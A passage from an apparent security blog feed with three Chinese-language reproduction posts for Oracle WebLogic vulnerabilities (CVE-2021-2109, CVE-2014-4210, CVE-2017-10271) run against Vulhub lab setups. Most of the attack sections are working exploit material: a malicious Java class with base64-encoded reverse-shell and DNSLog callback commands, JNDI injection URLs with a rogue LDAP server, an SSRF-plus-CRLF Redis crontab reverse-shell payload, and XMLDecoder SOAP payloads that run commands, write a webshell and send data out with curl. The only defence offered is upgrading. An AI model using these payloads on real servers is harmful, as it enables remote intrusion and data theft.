    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic JNDI注入RCE（CVE-2021-2109）。</p><h2 id="0x01-WebLogic-JNDI注入RCE（CVE-2021-2109）"><a href="#0x01-WebLogic-JNDI注入RCE（CVE-2021-2109）" class="headerlink" title="0x01 WebLogic JNDI注入RCE（CVE-2021-2109）"></a>0x01 WebLogic JNDI注入RCE（CVE-2021-2109）</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0。</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><p>拥有访问<code>/console/consolejndi.portal</code>页面的用户权限，或者存在CVE-2020-14883未授权访问漏洞。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>WebLogic的/console/consolejndi.portal接口可以调用存在JNDI注入漏洞的com.bea.console.handles.JndiBindingHandle类，从而造成RCE。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境搭建好之后，利用前面CVE-2020-14883的未授权访问漏洞可以直接访问到consolejndi.portal页面：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip:7001/console/css/%252e%252e%252fconsolejndi.portal</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/1.png" alt=""></p><p>先来编写一个恶意类Exp，其中payload为打DNSLog外带验证：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exp</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//Process p = Runtime.getRuntime().exec(newString[]&#123;"cmd","/c","calc.exe"&#125;);</span></span><br><span class="line">        Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"echo 'Y3VybCBodHRwOi8vd2VibG9naWMudnZkN3FzLmRuc2xvZy5jbi8=' | base64 -d | bash"</span>&#125;);</span><br><span class="line">        InputStream is = p.getInputStream();</span><br><span class="line">        BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line"></span><br><span class="line">        String line;</span><br><span class="line">        <span class="keyword">while</span>((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">            System.out.println(line);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        p.waitFor();</span><br><span class="line">        is.close();</span><br><span class="line">        reader.close();</span><br><span class="line">        p.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>开启Web服务，其中存放上述恶意类以供JNDI注入远程加载访问：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m SimpleHTTPServer 88</span><br></pre></td></tr></table></figure><p>开启恶意LDAP服务：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://172.19.0.1:88/<span class="comment">#Exp 9998</span></span><br></pre></td></tr></table></figure><p>原始Exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://172.19.0;1:9998/aew0xy;AdminServer%22)</span><br></pre></td></tr></table></figure><p>结合未授权访问漏洞的Exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/console/css/%252e%252e%252fconsolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://172.19.0;1:9998/aew0xy;AdminServer%22)</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/2.png" alt=""></p><p>在LDAP服务端和Web服务端都有记录：</p><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/3.png" alt=""></p><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/4.png" alt=""></p><p>DNSLog外带成功：</p><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/5.png" alt=""></p><p>证明存在漏洞且能外连，要反弹shell的话直接修改Exp类执行的命令在base64编码即可：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bash -i &gt;&amp; /dev/tcp/172.19.0.1/6666 0&gt;&amp;1</span></span><br><span class="line">Process p = Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTkuMC4xLzY2NjYgMD4mMQ==' | base64 -d | bash"</span>&#125;);</span><br></pre></td></tr></table></figure><p>更新Web服务上的Exp类后，再发一次报文就能成功获取到shell了：</p><p><img src="/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/6.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>参考：</p><p><a href="https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/wX9TMXl1KVWwB_k6EZOklw</a></p><p><a href="https://y4er.com/post/weblogic-cve-2021-2109-jndi-rce/" target="_blank" rel="noopener">https://y4er.com/post/weblogic-cve-2021-2109-jndi-rce/</a></p><p>待分析…</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>升级WebLogic版本。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic SSRF（CVE-2014-4210）</title>
    <link href="https://www.mi1k7ea.com/2021/04/06/%E6%B5%85%E6%9E%90WebLogic-SSRF%EF%BC%88CVE-2014-4210%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/</id>
    <published>2021-04-05T16:14:07.000Z</published>
    <updated>2021-04-06T07:53:05.643Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic SSRF（CVE-2014-4210），这个漏洞已经很老了。</p><h2 id="0x01-WebLogic-SSRF（CVE-2014-4210）"><a href="#0x01-WebLogic-SSRF（CVE-2014-4210）" class="headerlink" title="0x01 WebLogic SSRF（CVE-2014-4210）"></a>0x01 WebLogic SSRF（CVE-2014-4210）</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：<a href="https://vulhub.org/#/environments/weblogic/ssrf/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/ssrf/</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 10.0.2, 10.3.6。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>WebLogic的SearchPublicReqistries.jsp接口存在SSRF漏洞，如果服务端或内网存在Redis未授权访问漏洞等则可以进一步打漏洞组合拳进行攻击利用。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>无需登录，可以直接访问<code>/uddiexplorer/</code>接口，其中漏洞接口如图中所指的Search Public Registries：</p><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/1.png" alt=""></p><p>访问存活的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/2.png" alt=""></p><p>此时返回的错误信息是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic.uddi.client.structures.exception.XML_SoapException: The server at http://127.0.0.1:7001 returned a 404 error code &amp;#40;Not Found&amp;#41;.  Please ensure that your URL is correct, and the web service has deployed without error.</span><br></pre></td></tr></table></figure><p>访问不存在的地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7000</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/3.png" alt=""></p><p>此时返回的错误信息是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weblogic.uddi.client.structures.exception.XML_SoapException: Tried all: &amp;#39;1&amp;#39; addresses, but could not connect over HTTP to server: &amp;#39;127.0.0.1&amp;#39;, port: &amp;#39;7000&amp;#39;</span><br></pre></td></tr></table></figure><p>根据二元组的返回结果，就可以判断目标机子的端口服务是否开放，从而进行相应的SSRF攻击。</p><p>接着结合内网存在的Redis未授权访问进行利用。</p><p>先探测内网是否存在Redis服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.24.0.2:6379</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/4.png" alt=""></p><p>根据响应返回内容看到网络是通的，该内网IP存在Redis服务。</p><p>写入crontab计划通过bash反弹shell：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set 1 &quot;\n\n\n\n0-59 0-23 1-31 1-12 0-6 root bash -c &apos;bash -i &gt;&amp; /dev/tcp/172.22.0.1/6666 0&gt;&amp;1&apos;\n\n\n\n&quot;</span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename crontab</span><br><span class="line">save</span><br></pre></td></tr></table></figure><p>对其进行URL编码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.22.0.1%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave</span><br></pre></td></tr></table></figure><p>放到存在SSRF的参数值URL后面，注意在前面和后面分别添加<code>%0D%0A%0D%0A</code>来实现HTTP头CRLF注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://172.24.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn0-59%200-23%201-31%201-12%200-6%20root%20bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.22.0.1%2F6666%200%3E%261%27%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa</span><br></pre></td></tr></table></figure><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/5.png" alt=""></p><p>在Redis服务机子上成功写入crontab：</p><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/6.png" alt=""></p><p>成功通过crontab定时任务反弹shell：</p><p><img src="/2021/04/06/浅析WebLogic-SSRF（CVE-2014-4210）/7.png" alt=""></p><p>crontab写入Tips：</p><ul><li><code>/etc/crontab</code></li><li><code>/etc/cron.d/*</code>：将任意文件写到该目录下，效果和crontab相同，格式也要一致，并且在该目录操作可以做到不覆盖任何其他文件的情况进行弹shell；</li><li><code>/var/spool/cron/root</code>：CentOS系统下root用户的cron文件；</li><li><code>/var/spool/cron/crontabs/root</code>：Debian系统下root用户的cron文件；</li></ul><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>待分析…</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><p>升级WebLogic版本。</p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
      <category term="WebLogic" scheme="https://www.mi1k7ea.com/tags/WebLogic/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</title>
    <link href="https://www.mi1k7ea.com/2021/04/05/%E6%B5%85%E6%9E%90WebLogic-XMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2017-10271%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/</id>
    <published>2021-04-05T14:21:19.000Z</published>
    <updated>2021-05-13T10:34:12.842Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>简单学习WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）。</p><h2 id="0x01-WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）"><a href="#0x01-WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）" class="headerlink" title="0x01 WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）"></a>0x01 WebLogic XMLDecoder反序列化漏洞（CVE-2017-10271）</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>用的Vulhub：<a href="https://vulhub.org/#/environments/weblogic/CVE-2017-10271/" target="_blank" rel="noopener">https://vulhub.org/#/environments/weblogic/CVE-2017-10271/</a></p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>Oracle WebLogic Server 。</p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>WebLogic的WLS Security组件对外提供WebService服务，其中使用XMLDecoder来解析XML格式数据，其存在反序列化漏洞，从而导致RCE。</p><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>直接发送PoC报文如下，利用DNSLog外带验证（报文内容类型是SOAP型WebService报文，参考之前的WebService渗透测试文章来构造即可）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: your-ip:7001</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Content-Length: 633</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</span><br><span class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</span><br><span class="line">&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</span><br><span class="line">&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</span><br><span class="line">&lt;void index=&quot;0&quot;&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;1&quot;&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;void index=&quot;2&quot;&gt;</span><br><span class="line">&lt;string&gt;ping weblogic.16qkmh.dnslog.cn&lt;/string&gt;</span><br><span class="line">&lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">&lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">&lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p>DNSLog看到请求记录：</p><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/1.png" alt=""></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="直接反弹shell"><a href="#直接反弹shell" class="headerlink" title="直接反弹shell"></a>直接反弹shell</h4><p>反弹shell的Exp报文，将PoC中填入命令的那一行修改下即可（其实特殊符号无需编码也可以）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i &amp;gt;&amp;amp; /dev/tcp/172.19.0.2/21 0&amp;gt;&amp;amp;1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br></pre></td></tr></table></figure><p>exploit-db中的Exp脚本，直接用于反弹shell：<a href="https://www.exploit-db.com/exploits/43458/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/43458/</a></p><p>但是在Vulhub的环境用不了，因为其Linux反弹shell的Exp用的Python，但目标环境没，这里改成用bash反弹shell即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># self.cmd_payload = (</span></span><br><span class="line"><span class="comment">#     "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket."</span></span><br><span class="line"><span class="comment">#     "SOCK_STREAM);s.connect((\"&#123;lhost&#125;\",&#123;lport&#125;));os.dup2(s.fileno(),0); os.dup2("</span></span><br><span class="line"><span class="comment">#     "s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"</span></span><br><span class="line"><span class="comment"># ).format(lhost=self.lhost, lport=self.lport)</span></span><br><span class="line">self.cmd_payload = (</span><br><span class="line">    <span class="string">"bash -i &gt;&amp; /dev/tcp/&#123;lhost&#125;/&#123;lport&#125; 0&gt;&amp;1"</span></span><br><span class="line">    ).format(lhost=self.lhost, lport=self.lport)</span><br></pre></td></tr></table></figure><p>还有个点就是换成<code>/bin/bash</code>而非<code>/bin/sh</code>，改了之后就可以OK了：</p><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/2.png" alt=""></p><h4 id="写WebShell"><a href="#写WebShell" class="headerlink" title="写WebShell"></a>写WebShell</h4><p>写入WebShell的Exp报文，看报文内容即可，换了java.io.PrintWriter类进行操作，其中WebShell文件时写入到了<code>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp</code>中，其通过<code>http://ip:7001/bea_wls_internal/test.jsp</code>访问得到：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java</span>&gt;</span><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.io.PrintWriter"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"println"</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">    &lt;![CDATA[</span><br><span class="line">&lt;% out.print("test"); %&gt;</span><br><span class="line">    ]]&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"close"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/3.png" alt=""></p><p>期间可以通过HTTP OOB来外带看看是否创建成功（服务端使用<code>nc -lvnp 6666</code>监听即可）：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span> <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">string</span>&gt;</span>curl http://x.x.x.x:6666/x -d "x=`ls servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war`"<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2021/04/05/浅析WebLogic-XMLDecoder反序列化漏洞（CVE-2017-10271）/4.png" 